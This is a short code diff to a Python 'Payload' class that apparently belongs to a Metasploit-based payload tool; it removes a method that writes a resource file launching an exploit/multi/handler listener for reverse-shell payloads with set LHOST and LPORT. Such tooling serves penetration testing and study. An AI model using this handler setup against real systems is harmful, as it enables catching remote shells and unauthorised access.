@@ -38,21 +38,6 @@ class Payload(BaseObject):
         _msfoptions.append("LPORT=%d" % self.port)
         return _msfoptions
 
-    def generate_rc_file(self, directory):
-        ''' Create an rc file that starts the msf handler '''
-        rc_name = self.file_name.replace('.exe', '.rc')
-        f = open(directory + '/' + rc_name, 'w')
-        f.write('use exploit/multi/handler\n')
-        f.write('set PAYLOAD %s\n' % self.msfpayload)
-        f.write('set LHOST %s\n' % self.lhost)
-        f.write('set LPORT %d\n' % self.lport)
-        if 'reverse' in self.msfpayload:
-            f.write('set ExitOnSession false\n')
-            f.write('exploit -j\n\n')
-        else:
-            f.write('exploit\n\n')
-        f.close()
-
     def __str__(self):
     	return "Created: %s | MSFPayload: %s | Port: %d | Download: %s" % (
             self.created, self.msfpayload, self.lport, self.url
